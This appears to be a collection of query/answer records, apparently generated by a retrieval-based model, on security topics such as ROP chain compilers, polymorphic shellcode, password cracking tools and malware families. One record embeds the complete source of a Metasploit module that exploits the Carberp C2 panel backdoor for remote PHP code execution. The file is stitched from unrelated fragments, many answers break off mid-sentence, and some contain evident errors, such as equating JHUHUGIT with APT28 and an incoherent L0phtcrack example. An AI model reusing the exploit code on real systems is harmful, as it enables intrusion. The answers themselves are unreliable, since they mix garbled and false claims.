{"query": "What is MAJORCA and what does MAJORCA outperform??", "Answer": "MAJORCA stands for Multi Architecture JOP and ROP Chain Assembler. It is a library written in Python designed to help users create ROP (Return-Oriented Programming) chains through API calls. MAJORCA supports both Linux and Windows operating systems and works with both x86 and MIPS architectures.The paper you provided describes the techniques used in MAJORCA to automate the process of generating both ROP and JOP (Jump- Oriented Programming) payloads in an architecture-agnostic manner while taking into consideration restricted symbols like null bytes that terminate data copying via functions like strcpy.One of the main contributions of MAJORCA is its ability to outperform other open-source tools. According to the research presented in the paper, MAJORCA was able to generate more ROP chains compared to other popular tools like ROPgadget and Ropper. Additionally, MAJORCA considered restricted symbols both in gadget addresses and data, whereas only a few other authors had done so previously. These improvements resulted in faster and more effective ROP chain generation."}
{"query": "What does MAJORCA outperform and What is present to compare MAJORCA with open-source rop-compilers?", "Answer": "According to the given text, MAJORCA outperforms other open-source rop-compilers in terms of generating both ROP and JOP payloads for x86 and MIPS architectures. The text provides evidence that MAJORCA can generate more ROP chains compared to other tools, covering almost all successful cases. Specifically, it mentions that MAJORCA successfully generates 112 ROP chains out of 529 files on 32-bit Malta Linux, whereas other tools did not generate any workable payloads.Moreover, the text proposes a ROP chaining metric to estimate the efficiency of OS defenses against ROP chaining. Using this metric, it shows that Debian 10 is less defended from ROP (and JOP) chaining than other operating systems like CentOS 7 and OpenBSD 6.2. However, even though almost half of the binaries containing syscall gadgets can be used for successful ROP chaining, the text suggests that there is room for improvement in handling large files and precise gadget classification.To compare MAJORCA with open-source rop-compilers, the authors suggest using rop-benchmark, which is mentioned earlier in the text. They provide a table showing the ROP chaining metric for different operating systems, demonstrating that MAJORCA performs better than other open-source tools in terms of generating ROP chains."}
{"query": "What can MAJORCA use both ROP and JOP gadgets and How does MAJORCA generate ROP chains?", "Answer": "MAJORCA is a multi-architecture ROP (Return-Oriented Programming) and JOP (Jump-Oriented Programming) chain assembler. It can use both ROP and JOP gadgets to generate ROP chains. When using JOP gadgets, MAJORCA combines each JOP gadget with a ROP gadget that loads the next address value to the jump target register. This ensures that the output registers of the ROP gadget do not conflict with those of the JOP gadget.To generate ROP chains, MAJORCA first identifies ROP and JOP gadgets within the target binary. These gadgets are classified based on their semantic types, such as register initialization, memory initialization, system calls, and function calls. After classification, MAJORCA filters and sorts the gadgets based on their quality.Next, MAJORCA constructs a graph of moves between registers to understand the dependencies and relationships between different registers. Using this information, it creates Directed Acyclic Graphs (DAGs) for initializing memory and registers.Then, MAJORCA iteratively selects DAGs to construct the requested ROP chain. Careful consideration is given to selecting the most reliable and effective combinations of gadgets to minimize the risk of failure or detection. Once the optimal combination of gadgets is identified, MAJORCA generates the ROP chain by linking the selected gadgets together.Finally, the generated ROP chain is output in a human-readable format, enabling easy integration into further stages of an exploit or for research purposes."}

{"query": "What is the difference between Driller and Sizkaller?", "Answer": "Driller and Syzkaller are two different tools used for finding bugs in the Linux kernel, but they operate based on distinct principles and techniques.Driller is a tool developed by researchers at Carnegie Mellon University, which combines symbolic execution with traditional fuzzing techniques to augment the effectiveness of fuzz testing. Driller performs symbolic execution on selected parts of the kernel code during fuzzing, allowing it to explore a larger search space and identify previously unknown vulnerabilities. It integrates with existing fuzzing engines like American Fuzzy Lop (AFL) and LibFuzzer to enhance their capabilities.Syzkaller, on the other hand, is a standalone kernel fuzzer specifically designed to find bugs in the Linux kernel by generating and executing random inputs to various kernel interfaces and subsystems. Syzkaller maintains the state of the system during the test run and uses that state to inform the generation of future inputs. Unlike Driller, Syzkaller does not rely on symbolic execution but rather explores the kernel's behavior under diverse conditions.To summarize, Driller enhances the capabilities of existing fuzzing engines by incorporating symbolic execution, whereas Syzkaller is a dedicated kernel fuzzer that generates and executes random inputs to discover vulnerabilities directly in the kernel."}

{"query": "What is ADMutate and What does ADMutate dynamically modify?", "Answer": "ADMutate is a polymorphic buffer overflow engine that generates polymorphic shellcode. It is a tool that helps attackers create multiple functionally equivalent exploits by using simple encryption techniques and substituting no-effect instructions in place of NOPs. This confuses IDS tools that search for signatures of known machine-language exploits or NOP sleds.ADMutate dynamically modifies two main components of a buffer overflow attack script: the NOPs and the shellcode. Specifically, it replaces the NOPs with a random mix of no-effect instructions and encrypts the shellcode differently each time. These modifications make it challenging for signature-based detection methods to identify the malicious code. However, the return address remains constant throughout each instance of a buffer overflow attack, allowing it to be used for detection purposes."}

The comparison focused on evaluating Buttercup's ability to detect polymorphic shellcode attacks, particularly in relation to Snort's performance.Buttercup is a proposed solution introduced in a research paper aimed at detecting polymorphic shellcode attacks. Its main objective is to identify the ranges of possible return memory addresses for existing buffer overflow vulnerabilities and raise a red flag if a packet contains such addresses. This approach helps minimize false positives and effectively drops worm packets based on known buffer overflow vulnerabilities."}
{"query": "What is a tradeoff between security and performance associated with a security policy and for authentication time?", "Answer": "In the context of network security, there is always a tradeoff between security and performance associated with a security policy, depending upon the network scenario and traffic types. Generally speaking, a security policy with higher strength is not always the best option for all scenarios. Cross-layer integration of security protocols may provide the strongest protection, but with more overhead together. The stronger the security, the more signing and delay overhead there tends to be, although the overhead does not necessarily increase monotonically with the security strength.With regard to authentication time, experiments have shown that it is a significant contributor to QoS degradation in the network compared to cryptographic cost. IPsec policies offer the best tradeoff between security and performance for authentication time, while 802.1x-EAP-TLS is the best suitable option for low cryptographic cost and better security strength in many scenarios.Therefore, organizations must carefully consider their specific requirements and priorities when designing and implementing security policies. Balancing security and performance is crucial to maintaining an effective and efficient security posture."}

{"query": "What is displayed by L0phtcrack and What does L0phtcrack display as each half of a password is cracked?", "Answer": "L0phtcrack is a password recovery tool that is primarily used to recover Windows-based passwords. One of the methods used by L0phtcrack to recover passwords is through the use of rainbow tables. When L0phtcrack cracks a password, it splits the password into halves and cracks each half independently. As each half of the password is cracked, L0phtcrack displays the result.For instance, let's assume the original password is \"PASSWORD123\". L0phtcrack would split this password into \"PASSWORD\" and \"123\". It would then crack the first half (\"PASSWORD\") using rainbow tables and display something like \"pass:password1\" as the result. Similarly, it would crack the second half (\"123\") using other techniques like brute force or dictionary attacks and display something like \"num:onetwothree\" as the result.Once both halves of the password are cracked, L0phtcrack would combine the results and display the full password, which in this case would be \"password1:onetwothree\".

{"query": "What are the Dropper and the Loader of Gelsemium?", "time": 9.166609764099121, "Answer": " In the context you provided, Gelsemium is a type of modular malware that consists of three components: a dropper (Gelsemine), a loader (Gelsenicine), and main (Gelsevirine) plugins. The dropper and loader are parts of the malware's infrastructure responsible for delivering and loading the final payload into the victim's system. I will provide a detailed explanation of both.Dropper (Gelsemine):A dropper is a piece of malicious software designed to deliver and install other malware onto a target system. Droppers often employ various techniques to evade detection and ensure successful delivery of their payload. They can take many forms, such as documents, scripts, or executables.In the case of Gelsemium, Gelsemine is the dropper component. Once it infects a system, Gelsemine performs specific tasks to prepare the environment for the next stage of the attack\u2014loading the Gelsenicine loader. These actions might include disabling security measures, establishing persistence mechanisms, or allocating memory resources. After completing these tasks, Gelsemine drops and executes the Gelsenicine loader on the infected machine. By separating the dropper from the primary payload, the attackers increase their chances of remaining undetected during analysis and deployment.Loader (Gelsenicine):The loader is another critical component of the malware infection chain. Its purpose is to load the final payload (in this case, Gelsevirine) into memory and execute it within the target system. Like droppers, loaders also focus on maintaining stealth and ensuring the smooth execution of subsequent stages.Once Gelsenicine is loaded and executed on the victim's machine by Gelsemine, it takes care of decrypting, resolving dependencies, and preparing the Gelsevirine plugin(s). This process includes mapping the necessary code segments into memory and setting up any required runtime environments before transferring control to the Gelsevirine module. As with most malware, the loader serves as a bridge between different modules while minimizing the risk of exposure.To sum up, the dropper (Gelsemine) and loader (Gelsenicine) are essential elements of the Gelsemium malware family.

They share some similarities as they can be used for protocol tunneling and maintaining access to compromised systems. However, there are several key differences between them.1. **Primary Functionality**: Although both tools serve a similar purpose (i.e., enabling communication with remote hosts), their primary functionalities differ slightly. PLINK is a derivative of PuTTY and provides SSH connectivity, while FLIPSIDE, developed by the threat group FIN5, focuses on providing secure channels for malware communications within a victim's network.2. **Protocol Support**: While Plink primarily supports Secure Shell (SSH) and Serial protocols, FLIPSIDE uses its custom protocol based on HTTP(S). This difference allows FLIPSIDE to blend into legitimate web traffic more easily than Plink, making it less conspicuous during security investigations.3. **Obfuscation capabilities**: To evade detection from defenders, FLIPSIDE incorporates various obfuscation techniques such as Base64 encoding, XOR operations, and string manipulation functions. These methods help conceal the underlying logic and make reverse engineering harder compared to Plink. On the other hand, Plink does not employ any advanced anti-forensics features since it relies on standard encryption algorithms like AES and RSA.4. **Integration with Malware**: As mentioned earlier, FLIPSIDE has been observed being integrated into malicious software created by the FIN5 group. It helps establish persistence and enables covert data exfiltration through encrypted channels disguised as regular web traffic. In contrast, Plink doesn't have this specific integration feature; however, adversaries may still incorporate it into their attack chains using different methodologies.5. **Platform Compatibility**: Since Plink is derived from PuTTY, which supports multiple platforms, including Windows, Linux, macOS, etc., it enjoys better cross-platform compatibility compared to FLIPSIDE. The latter was designed mainly for Microsoft Windows environments due to its focus on supporting malware targeting these operating systems.In summary, although Flipside and Plink share certain characteristics related to connecting to remote systems, they cater to distinct purposes and possess unique traits.

Here's one possible scenario:1. Initial compromise: The attackers first gain access to the target network or system using various methods such as spear phishing, exploiting vulnerabilities, or supply chain attacks. Once they have gained access, they install the initial loader or dropper. This component might include both metaMain and Mafalda components.2. Establish persistence with metaMain: After gaining access, the attackers would likely deploy metaMain to establish a stable presence within the victim's environment. MetaMain achieves this through file deletion, hijacking execution flow, discovering files and directories, exfiltrating data over command-and-control channels, event-triggered executions, symmetric cryptography, deobfuscation/decoding files or information, staging local data, collecting data locally, archiving collected data, and employing web protocols. These techniques ensure that metaMain remains hidden while maintaining communication with its operators.3. Interaction with Mafalda: With metaMain providing persistent access, the attackers could then interact with Mafalda to perform more targeted activities depending upon their objectives.

{"query": "What are the differences between JHUHUGIT and Carberp?", "time": 8.485710144042969, "Answer": " Based on the context provided, JHUHUGIT and Carberp share a common origin as they both stem from the same source code. However, they have different objectives and functionalities, making them distinct malware variants. Here are some key differences between JHUHUGIT and Carberp:1. Origin and Development:Carberp is a banking Trojan that has been around since at least 2010. Its primary purpose was to steal financial information from infected systems. Over time, its source code became available on various underground forums, allowing other threat actors to modify and develop their versions.JHUHUGIT, also known as APT28 or Fancy Bear, is a Russian-linked advanced persistent threat (APT) group believed to be associated with the Main Intelligence Directorate (GRU). They developed JHUHUGIT using the leaked Carberp source code but repurposed it into a reconnaissance tool instead of focusing solely on stealing financial data.2. Functionality and Capabilities:Carberp's main functionality revolves around injecting web pages into browsers to intercept login credentials and two-factor authentication codes. This allows attackers to gain access to victims' online bank accounts and perform unauthorized transactions. The malware can spread through removable drives, instant messaging applications, and exploit kits.On the other hand, JHUHUGIT focuses on performing reconnaissance tasks within targeted networks. According to reports, this malware variant collects system information, checks for antivirus software presence, captures screenshots, logs keystrokes, and executes arbitrary commands. These capabilities enable APT28 to gather intelligence about potential targets before launching further attacks.3. Targeted Industries and Attribution:While Carberp primarily focused on targeting individuals and organizations involved in online banking, JHUHUGIT has been linked to several high-profile campaigns against government entities, military infrastructure, media outlets, and sports organizations worldwide. Due to its connection to APT28, JHUHUGIT is often attributed to having ties with Russia's state-sponsored hacking groups.In summary, while JHUHUGIT shares similarities with Carberp due to their shared origins, they differ significantly regarding development goals, functionalities, and targeted industries.", "context": "Code Available:METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::HttpClient def initialize(info={})   super(update_info(info,     'Name'           => 'Carberp Web Panel C2 Backdoor Remote PHP Code Execution',     'Description'    => %q{         This module exploits backdoors that can be found all over the leaked       source code of the Carberp botnet C2 Web Panel.     },     'License'        => MSF_LICENSE,     'Author'         =>       [         'bwall(Brian Wallace) <bwallace[at]cylance.com>', # msf module         'connection(Luis Santana) <hacktalkblog[at]gmail.com>', # exploit reporting         'Steven K <xylitol[at]malwareint[d0t]com>' # discovery and reporting       ],     'References'     =>       [         ['URL', 'http://www.xylibox.com/2013/06/carberp-remote-code-execution-carpwned.html']       ],     'Privileged'     => false,     'Payload'        =>       {         'Keys'        => ['php'],         'Space'       => 10000,         'DisableNops' => true       },     'Platform'       => ['php'],     'Arch'           => ARCH_PHP,     'Targets'        =>       [         ['carberp', {}]       ],     'DisclosureDate' => '2013-06-28',     'DefaultTarget'  => 0))   register_options(     [       OptString.new('TARGETURI',[true, \"The path to the backdoor, often just index.php\", \"/index.php\"]),       OptString.new('BOTID', [true, 'Hardcoded backdoor bot ID that can run PHP eval', 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV']),     ]) end def check   confirm_string = rand_text_alpha(8)   cmd = \"echo '#{confirm_string}';\"   shell = http_send_command(cmd)   check_code = Exploit::CheckCode::Safe   if shell and shell.body.include?(confirm_string)     check_code = Exploit::CheckCode::Vulnerable   end   check_code end def http_send_command(cmd)   uri = normalize_uri(target_uri.path.to_s)   request_parameters = {     'method'\t=> 'POST',     'uri'\t\t=> uri,     'vars_post'\t=>       {         'id' => datastore['BOTID'],         \"data\" => Rex::Text.encode_base64(cmd.unpack('H*'))       }   }   res = send_request_cgi(request_parameters)   res end def exploit   http_send_command(payload.encoded) endendInfos:('', 1.4111859798431396)JHUHUGIT is malware used by APT28.

The term \"cryptominer\" is used to describe software that uses a computer's processing power to mine cryptocurrencies without the user's knowledge or consent.In the context of the provided information, there are two separate incidents related to Monero Cryptominer. The first incident, \"Relaying Potatoes: Another Unexpected Privilege Escalation Vulnerability in Windows RPC Protocol,\" discusses a vulnerability in the Windows Remote Procedure Call (RPC) protocol that could be exploited to install a Monero Cryptominer. The attacker could use this vulnerability to gain administrative privileges on a Windows system and then install the Monero Cryptominer to mine the cryptocurrency.The second incident, \"Caught in the Cloud | How a Monero Cryptominer Exploits Docker Containers,\" discusses a different method of distributing Monero Cryptominer. In this case, the attackers exploited a vulnerability in Docker containers to install the Monero Cryptominer. Docker is a popular platform for developing, shipping, and running applications using container technology. The attackers could use compromised Docker images to install the Monero Cryptominer on systems that use Docker to run applications.Both incidents highlight the importanceVasek et al. are researchers who have conducted a comprehensive empirical analysis of Distributed Denial of Service (DDoS) attacks in the context of cryptocurrency mining, specifically focusing on the impact of these attacks on hash rate.Hash rate refers to the computational power used to validate transactions and create new blocks in a blockchain network. Miners compete to solve complex mathematical problems to validate transactions and add new blocks to the blockchain. The higher the hash rate, the more secure and decentralized the network is.In the context of cryptocurrency mining, DDoS attacks can be used to disrupt the network and prevent miners from accessing the blockchain. The adversary in these attacks uses a large number of compromised devices or bots to flood the network with requests, exhausting the resources of the miner or the network as a whole.For example, an honest miner may be congested with fraudulent transactions or requests from a large number of clients acting under the control of an adversary. After a while, the miner will likely start discarding all incoming inputs/requests, including those from honest clients. This can result in a significant decrease in hash rate, making the network less secure and decentralized.Vasek et al. have studied the impact of these attacks on hash rate in detail. They have analyzed various aspects of DDoS attacks on cryptocurrency mining, including the size and duration of the attacks, the types of attacks used, and the effectiveness of different countermeasures. Their research provides valuable insights into the nature and impact of DDoS attacks on hash rate and the broader implications for the security and decentralIn the context of the provided information, a \"Window\" in this context is likely referring to the Microsoft Windows operating system and its associated binary files or applications. The information suggests that researchers are studying malware that targets the Windows operating system, specifically in contrast to malware designed for Android systems.The text mentions that Android malware and Windows malware differ in various ways. For instance, the repackaging technique, which involves modifying legitimate software to include malicious code, is more common in Android APKs (Android Application Packages) than in Windows binary files.Additionally, the researchers in the study are employing a more systematic approach to malware development hunting on Windows systems than in a previous study. They have added an automated validation phase to their methodology.The approach mentioned in [30] for mining Windows malware development in Anubis is not explicitly stated in the provided text. However, it can be inferred that Anubis is a tool or platform used for the research. The term \"mining\" in this context likely refers to the process of extracting information or insights from the Windows malware samples.Overall, the text suggests that researchers are studying Windows malware and comparing it to Android malware, employing a more systematic approach and using Anubis as a tool for their research.WannaCryptor, also known as WannaCry or WanaCrypt0r, is a type of malware that emerged in 2017 and belongs to the ransomware family, specifically the Wana family. This malware gained notoriety due to its widespread and damaging attacks, particularly against organizations and enterprises around the world.According to various reports from security and cyber defense companies, including Kaspersky, SonicWall, WeLiveSecurity, and others, WannaCryptor is one of the most common ransomware families, alongside Locky, TeslaCrypt, Cerber, GandCrab, Locker, TorrentLocker, WannaCry, Stop, CryptoJoker, Dharma, and CrypWall.From 2006 to 2015, different versions of both symmetric and asymmetric ransomware were prevalent. However, starting from 2016, the use of ransomware began to increase significantly, with WannaCryptor being one of the most destructive and widespread variants.WannaCryptor is a self-replicating malware that exploits a vulnerability in Microsoft Windows operating systems, specifically the SMB (Server Message Block) protocol. Once the malware infects a system, it encrypts files and demands a ransom payment in the form of Bitcoin to decrypt them. The ransom note left by the malware informs the victim that they have 72 hours to pay the ransom before theBotnet Bots, also known as zombie computers or just bots, are a type of malware that turns infected computers or devices into part of a larger network of compromised systems, controlled by attackers, known as a botnet. These bots can perform various malicious activities, one of which is data collection. They are often used to gather sensitive information such as passwords, login credentials, and other valuable data from the victim's device or network.Recently, attackers have begun using cryptocurrencies like Bitcoin to receive payments for their illegal activities, instead of traditional bank transactions. This trend has led to an increase in the use of botnets to mine cryptocurrencies or to launch Distributed Denial of Service (DDoS) attacks against Bitcoin nodes or exchanges.Botnet bots can be installed on a victim's device through various means, such as phishing emails, malicious software downloads, or exploiting vulnerabilities in outdated software. Once installed, the botnet malware can control many computers and infected systems, creating a powerful network that attackers can use to launch DDoS attacks against specific servers. These attacks can cause significant damage by overwhelming the targeted server with traffic, making it unavailable to legitimate users.In the context of the provided information, it is essential to note that botnet bots are not limited to collecting data or launching DDoS attacks. They can also be used to mine cryptocurrencies, spread malware, or carry out other malicious activities. The use of Bitcoin for payments adds an additional layer of complexity toWannacry is a type of malware, specifically a ransomware attack that spread globally in May 2017. The name Wannacry comes from a combination of the words \"WannaCrypt0r\" and \"ransomware.\" The attack used the EternalBlue exploit, which targeted a vulnerability in the Microsoft Windows SMB (Server Message Block) protocol.In the context of the provided references, Wannacry is not directly mentioned in any of them. However, the references do discuss topics related to malware and security, which can provide some context to understand the significance of Wannacry.The first reference by Zain, Damasevi\u010d, and Abdulkareem ([54]) discusses image-based malware classification using the VGG19 network and spatial convolutional attention. This research is focused on developing a system to detect and classify malware based on images of malware samples. The Wannacry malware is not specifically mentioned in this paper, but it is an example of a malware attack that could potentially be detected and classified using such a system.The second reference by Franz ([Distributed Denial-of-Service (DDoS) is a type of cyber-attack that aims to make a network or a particular service unavailable by overwhelming it with traffic from multiple sources. In the context of communication networking protocols, a DDoS attack is carried out by distributing the traffic across a large number of sources, making it difficult for the targeted network or service to distinguish legitimate traffic from malicious traffic and respond accordingly.In the case of Bitcoin, which is a decentralized digital currency, the distributed nature of its network and consensus protocol makes it less vulnerable to traditional Denial-of-Service (DoS) attacks. However, attackers have adapted to this by launching more powerful Distributed Denial-of-Service (DDoS) attacks against Bitcoin-related services, such as currency exchanges, mining pools, and eWallets.The primary goal of a DDoS attack against Bitcoin services is to disrupt their availability and prevent legitimate users from accessing them. This can result in financial losses, reputational damage, and even compromise the security of the targeted service.A DDoS attack against Bitcoin services typically involves the use of botnets, which are networks of compromised computers or devices that can be controlled remotely by attackers. The attackers use these botnets to generate large amounts of traffic, often in the form of fake transactions or requests, which are then directed towards the targeted Bitcoin service.The distributed nature of the attack makes it difficult for the targeted service to distinguish legitimate traffic from malicious traffic and respond accordingly. This can result in the service being overwhelmed and unable to process legitimate transactions or requests, effectively denying service to its users.Modern malware refers to the latest types of malicious software that are designed to harm devices, particularly computers, laptops, smartphones, and other connected devices. Malware is short for malicious software, and it includes various types of threats such as viruses, worms, ransomware, spyware, adware, and cryptojackers.In the context of the provided information, modern malware includes cryptojackers and mobile malware. Cryptojacking is a type of malware that hijacks devices to mine cryptocurrencies without the owner's knowledge or consent. This can result in decreased device performance, increased electricity usage, and potential damage to the device. Cryptojacking attacks can be delivered through various vectors, including email attachments, malicious websites, and software vulnerabilities.Mobile malware, on the other hand, is a type of malware that targets mobile devices, such as smartphones and tableCrypto Ransomware is a type of malicious software, or malware, designed to encrypt files on a victim's computer or network, rendering them inaccessible. The name \"crypto\" comes from the use of encryption algorithms to scramble the data. Once the files are encrypted, the ransomware demands a payment, typically in the form of cryptocurrency, in exchange for the decryption key.1. Process Injection (PI): Crypto ransomware often uses process injection techniques to execute its code in the memory of running processes. This allows the malware to evade detection and analysis by security software.2. Anti-Debugging (AD): To prevent detection and analysis, crypto ransomware may employ anti-debugging techniques. These methods can include checking for debuggers, disabling breakpoints, and terminating processes that are suspected to be debuggers.3. Scanning (Sc):I. INTRODUCTIONThe blockchain-based cryptocurrencies have gained significant attention and popularity beyond specialized industries like finance and technology. Cryptocurrencies offer decentralized digital transactions, eliminating the need for intermediaries and providing anonymity. However, this innovation has also attracted malicious actors, leading to an increase in cryptojacking attacks.II. CRYPTOJACKINGCryptojacking is a type of malware that surreptitiously uses a victim's computing resources to mine cryptocurrencies without their consent. The primary goal of cryptojacking is to generate revenue for the attacker by exploiting the victim's resources. This can lead to financial losses for individuals and organizations due to increased electricity consumption, decreased system performance, and potential hardware damage.III. BROWSER-BASED CRYPTOJACKINGBrowser-based cryptojacking is a subset of cryptojacking that targets web browsers. This type of attack utilizes malicious scripts, often embedded in websites or advertisements, to mine cryptocurrencies in the background while the user is browsing. One of the most popular tools used for browser-based cryptojacking is Coinhive.IV. COINHIVECoinhive is a JavaScript miner that allows websites to monetize their traffic by using visitors' computing power to mine Monero (XMR), a popular privacy-focused cryptocurrency. While Coinhive was initially designed as a legitimate tool for website monetization, it has been widely adopted by cybercriminals for unauthorized mining.V. UNAUTHORIZE. Chovancov \u00b4a is an author of a research paper titled \"A Clustered Hybrid Honeypot Architecture,\" published in Acta Polytechnica Hungarica in October 2019. In this paper, Chovancov \u00b4a and his co-author \u00b4A. Norbert propose a new architecture for a hybrid honeypot system. A honeypot is a security system designed to attract and detect cyber attacks. Hybrid honeypots combine the features of production systems and honeypots, allowing researchers to study real-world attacks while also providing protection for actual systems.The authors describe their architecture as clustered because it consists of multiple honeypots that communicate and cooperate with each other. Each honeypot in the cluster runs a specific service or application to attract different types of attacks. The authors also discuss the use of machine learning algorithms to analyze the behavior ofT. Mursch is a cybersecurity researcher or expert who is part of a team that published a research paper titled \"A first look at the crypto-mining malware ecosystem: A decade of unrestricted wealth\" in the context of the Security and Privacy Analytics conference held in New York, NY, USA, in March 2017. The paper was co-authored with M. Oulehla, Z. K. Oplatkova\u2019, and D. Malanik.The research focused on the detection of crypto-mining malware using neural networks, which is a type of machine learning algorithm. The team presented their findings at the Future Technologies Conference in San Francisco, CA, USA, in December 2016, as indicated in the first reference [48].Crypto-mining malware is a type of malicious software that surreptitiously uses the computing resources of an infected computer or network to mine cryptocurrencies, such as Bitcoin or Monero, without the user's knowledge or consent. The researchers aimed to develop a detection system to identify and mitigate the spread of such malware.The second reference [49] is not related to T. Mursch or the research paper. It is a link to AlexaAli Aydin Selcuk is one of the authors of a research paper titled \"Defending Against Cryptojacking Malware: Application Agnostic Approach\" published in the 51st Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN) in 2021. The paper can be found at this link: <https://www.arxiv-vanity.com/papers/2103.03851/>.The paper discusses the issue of cryptojacking malware, which is a type of malware that covertly uses the computational resources of a victim's device to mine cryptocurrencies without their consent. The authors aim to provide a defense mechanism against such malware that is application agnostic, meaning it can protect various applications from cryptojacking attacks.The authors of the paper are Ege Tekiner, Abbas Acar, A. Selcuk Uluagac, Engin Kirda, and Ali Aydin Selcuk. Ali Aydin Selcuk is one of the five authors of the paper.TheKinsing is a type of malware, specifically a cryptocurrency miner, that was discovered to be spread through the exploitation of a vulnerability in Apache ActiveMQ, identified as CVE-2023-46604. This vulnerability allowed attackers to download and infect Linux systems with the Kinsing malware.Apache ActiveMQ is an open-source message broker platform written in Java. The vulnerability, CVE-2023-46604, is a deserialization remote code execution (RCE) flaw. This means that an attacker could send a specially crafted message to an Apache ActiveMQ server, causing it to execute arbitrary code. In this case, the attackers used this vulnerability to download and install the Kinsing malware on the compromised Linux systems.Once installed, Kinsing uses the affected system's resources to mine Monero cryptocurrency. This type of malware is also known as h2miner, as it is based on the H2 mining software. Kinsing is designed to evade detection by using various techniques, such as changing its configuration and mining parameters to blend in with legitimate mining processes.The spread of Kinsing through the Apache ActiveMQ vulnerability was reported in November 2023. This incident highlights the importance of keeping software up-to-date and applying security patches promptJ. Olivares-Mercado is an author or researcher who has contributed to the field of cybersecurity, specifically in the area of malware attack trends and defense mechanisms. The context of this information can be found in a review article titled \"State-of-the-Art Malware Attack Trends and Defense Mechanisms\" authored by J. Ferdous and colleagues, published in the journal Sensors in 2022.In this article, the authors discuss various malware attack trends and defense mechanisms. One of the sections of the article focuses on cryptojacking, which is a type of malware that secretly uses a victim's computing resources to mine cryptocurrency. In this section, there is a subsection titled \"On detecting cryptojacking on websites: Revisiting the use of classifiers,\" which was authored by F. A. Aponte-Novoa, D. P. \u00c1lEskandari is a research team or researchers, specifically Eskandari et al., who have focused on the analysis and detection of crypto-jacking attacks using botnets. Crypto-jacking is a type of cyber attack where unauthorized cryptocurrency mining is performed on a victim's device or website. Botnets are networks of compromised computers or devices that can be controlled remotely to carry out coordinated cyber attacks.The Eskandari team has developed a framework to detect malicious behaviors related to cryptocurrency mining code in suspected websites. Their framework analyzes the code of these websites to identify any potential crypto-jacking activities. The team's research has been evaluated using Alexa's Top 1 Million websites, which are the most frequently visited websites on the internet.By analyzing the code of these websites, the Eskandari team is able to identify new trends towards in-browser mining and the financial impacts of such attacks. In-browser mining refers to the use of a web browser to mine cryptocurrencies, which can be more difficult to detect and block compared to traditional mining malware. The financial impacts of crypto-jacking attacks can be significant, as they can result in increased electricity bills for victims, decreased website performance, and potential damage to the reputation of the affected website or organization.Overall, the Eskandari team's research is important in understanding the growing threat of crypto-jacking attacks using botnets and developing effective methods for detecting and mitigating these attacks. Their work highlights the need for continued research and development in the field of cybersecurity, particularly as the use of cryptocurrencies and other emerging technologies continues to grow.Wannacry, also known as WannaCrypt or WannaCrypt0r, is a type of malware, specifically a ransomware attack that spread rapidly across the internet in May 2017. The name Wannacry comes from a combination of the words \"WannaCrypt\" and \"ransomware.\"The primary objective of Wannacry was to encrypt files on a victim's computer and demand a ransom payment in the form of Bitcoin to decrypt them. However, what made Wannacry particularly noteworthy and dangerous was its ability to exploit a vulnerability in Microsoft Windows operating systems, specifically those that had not been patched against the EternalBlue exploit. This exploit, developed by the National Security Agency (NSA), had been leaked online, and Wannacry used it to propagate itself from one vulnerable computer to another on a network.The vulnerability that Wannacry exploited, CVE-2017-0144, was a remote code execution vulnerability in the Microsoft Server Message Block (SMB) protocol. This meant that an attacker could execute arbitrary code with \"system\" privileges on a vulnerable system, giving them complete control over the computer.The Microsoft Security Response Center (MSRC) issued an advisory warning that this vulnerability was also wormable, meaning it could self-replicate and spread from one computer to another on a network without any user interaction. This behavior was seen in attacks including Wannacry and EsteemAudit.The seriousness of this vulnerability and its potential impact to the public led Microsoft to take the rare step of releasing a patch for the no longer supported Windows XP operating system.Polymorphic malware refers to a type of malicious software that can change its code or behavior to evade detection by security systems. In the context of the papers you have provided, the authors, Pasupulati, Coit, Levitt, and Wu, have developed a system called Buttercup for detecting polymorphic buffer overflow vulnerabilities in networks.Buffer overflow vulnerabilities occur when a program attempts to write more data to a buffer than it can hold, resulting in the overwriting of adjacent memory. Polymorphic buffer overflow attacks use this vulnerability to inject malicious code into a system, but they can change the code each time they are executed to avoid detection.The Buttercup system is designed to detect polymorphic buffer overflow attacks by analyzing network traffic for suspicious patterns. The authors explain that they use a combination of static and dynamic analysis techniques to identify potential buffer overflow vulnerabilities and then monitor network traffic for signs of anMalwarebytes is a leading cybersecurity company that provides software solutions to protect computers, websites, and applications from various types of malware, including unauthorized mining scripts. Malwarebytes' primary focus is on detecting and removing malware, but in the context of cryptojacking prevention, the company offers specific tools and techniques to safeguard against this type of attack.Cryptojacking is a form of malware that covertly uses a victim's device or web browser to mine cryptocurrency without their consent.

These tools allow users to block specific websites or scripts from executing mining scripts, providing an extra layer of protection against cryptojacking attacks.In summary, Malwarebytes is a cybersecurity company that offers software solutions to protect against various types of malware, including unauthorized mining scripts. Its cryptojacking prevention techniques and tools include regular scanning and monitoring of website source code, files, and browser extensions, as wellLachtar is not a specific entity or term mentioned in the provided sources. Instead, the sources discuss a cryptojacking malware named Delay-CJ, which was identified and analyzed by researchers in the cybersecurity community.Cryptojacking is a type of malware that surreptitiously uses a victim's computing resources to mine cryptocurrencies without their knowledge or consent. Delay-CJ is a novel variant of cryptojacking malware that employs a delayed strategy for covert attacks.According to the research paper [11], Delay-CJ uses a delayed strategy to evade detection by monitoring the system's CPU usage and adjusting the mining intensity accordingly. The malware also employs various techniques to hide its presence, such as using a legitimate process name and encrypting its communication with the command-and-control server.The authors of the paper [11] are Ege Tekiner, Abbas Acar, A. Selcuk Uluagac, Engin Kirda, and Ali Aydin Selcuk. They presented their findings at the 2021 IEEE European Symposium on Security and Privacy (EuroS&P).The second source [12] mentions a research paper titled \"An In-Sergio and Guillermo are researchers or authors in the field of computer security, specifically focusing on the area of detecting and mitigating crypto-mining botnets. A botnet is a network of compromised computers or devices that can be controlled remotely by an attacker to execute malicious activities. In this context, crypto-mining botnets refer to botnets that are used to mine cryptocurrencies without the owner's knowledge or consent.The researchers have presented a large-scale case study on the recent crypto-mining botnets and the techniques that could be used to hinder this kind of threat. They have extracted a set of features from the traffic data of mobile devices to be used by neural networks for classification. This means that they have identified specific characteristics or patterns in the network traffic that can help distinguish between normal traffic and traffic generated by crypto-mining botnets.The researchers' work builds upon previous research by Konoth et al. who have proposed a cryptocurrency malware detection framework called MineSweeper. MineSweeper is a machine learning-based framework that could be used for 